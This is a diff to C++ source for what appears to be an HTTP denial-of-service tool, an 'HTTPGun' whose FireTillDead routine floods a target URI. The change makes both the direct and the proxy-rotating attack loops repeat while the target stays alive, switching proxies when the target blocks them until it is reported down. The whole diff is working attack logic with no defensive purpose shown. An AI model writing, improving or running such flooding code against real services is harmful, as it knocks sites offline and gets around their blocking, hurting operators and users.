@@ -54,13 +54,42 @@ std::size_t HTTPGun::FireTillDead(const URI &targetToKill) noexcept
 	std::size_t hits{0};
 
 	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
-	if(AttackWithNoProxy(targetToKill, hits))
+	bool shouldRepeat{false};
+	do
 	{
-		return hits;
+		shouldRepeat = false;
+		const auto attackResult{AttackWithNoProxy(targetToKill, hits)};
+
+		if(attackResult)
+		{
+			if(*attackResult == TargetStatus::TargetAlive)
+			{
+				shouldRepeat = true;
+			}
+			else if(*attackResult != TargetStatus::TargetBlocking)
+			{
+				return hits;
+			}
+		}
+		else
+		{
+			return hits;
+		}
 	}
+	while(shouldRepeat);
 
 	SPDLOG_INFO("Attacking {} with proxy", targetToKill);
-	AttackWithProxy(targetToKill, hits);
+	do
+	{
+		shouldRepeat = false;
+		const auto attackResult{AttackWithProxy(targetToKill, hits)};
+		if(attackResult &&
+			*attackResult == TargetStatus::TargetAlive)
+		{
+			shouldRepeat = true;
+		}
+		
+	} while(shouldRepeat);
 
 	return hits;
 }
@@ -86,7 +115,7 @@ HTTPGun::TargetStatus HTTPGun::FireGun()
 	}
 }
 
-bool HTTPGun::AttackWithNoProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
+std::optional<HTTPGun::TargetStatus> HTTPGun::AttackWithNoProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	size_t errorsCount{0};
 
@@ -96,17 +125,18 @@ bool HTTPGun::AttackWithNoProxy(const URI &targetToKill, std::size_t &hitsCount)
 	while(!m_currentTask.ShouldStop())
 	{
 		SetupNonProxyHeaders();
-		switch(FireGun())
+		const auto targetStatusAfterAttack{FireGun()};
+		switch(targetStatusAfterAttack)
 		{
 			case TargetStatus::TargetBlocking:
 			{
 				SPDLOG_WARN("Target {} is blocking non proxy requests, leaving", targetToKill);
-				return false;
+				return targetStatusAfterAttack;
 			}
 			case TargetStatus::TargetDown:
 			{
 				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill);
-				return true;
+				return targetStatusAfterAttack;
 			}
 			case TargetStatus::TargetAlive:
 			{
@@ -118,21 +148,21 @@ bool HTTPGun::AttackWithNoProxy(const URI &targetToKill, std::size_t &hitsCount)
 				if(++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
 				{
 					SPDLOG_WARN("Too many errors emited on no proxy attack, leaving");
-					return true;
+					return targetStatusAfterAttack;
 				}
 			}
 		}
 	}
 
-	return false;
+	return std::nullopt;
 }
 
-void HTTPGun::AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
+std::optional<HTTPGun::TargetStatus> HTTPGun::AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	if(!LoadProxies())
 	{
 		SPDLOG_WARN("Failed to load any working proxies");
-		return;
+		return std::nullopt;
 	}
 
 	m_wrapper.SetTarget(targetToKill.GetFullURI());
@@ -151,7 +181,7 @@ void HTTPGun::AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) n
 		else
 		{
 			SPDLOG_INFO("Proxy list exhausted, leaving");
-			return;
+			return std::nullopt;
 		}
 
 		// Attacking
@@ -162,18 +192,20 @@ void HTTPGun::AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) n
 		{
 			SetupProxyHeaders(currentProxy.first);
 
-			switch(FireGun())
+			const auto targetStatusAfterAttack{FireGun()};
+			switch(targetStatusAfterAttack)
 			{
 				case TargetStatus::TargetBlocking:
 				{
 					SPDLOG_INFO("Target {} is blocking current proxy, trying other", targetToKill);
+					// Leaving loop
 					currentProxyAttackCounter = ProxyConfig::MAX_PROXY_ATTACKS;
 					break;
 				}
 				case TargetStatus::TargetDown:
 				{
 					SPDLOG_INFO("Target: {} is down, looking for others", targetToKill);
-					return;
+					return targetStatusAfterAttack;
 				}
 				case TargetStatus::TargetAlive:
 				{
@@ -186,11 +218,13 @@ void HTTPGun::AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) n
 					if(++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
 					{
 						SPDLOG_INFO("Too many errors emited on proxy attack, trying other");
-						return;
+						return targetStatusAfterAttack;
 					}
 				}
 			}
 		}
 		SPDLOG_WARN("Current proxy exhausted, looking for other");
 	}
+
+	return std::nullopt;
 }
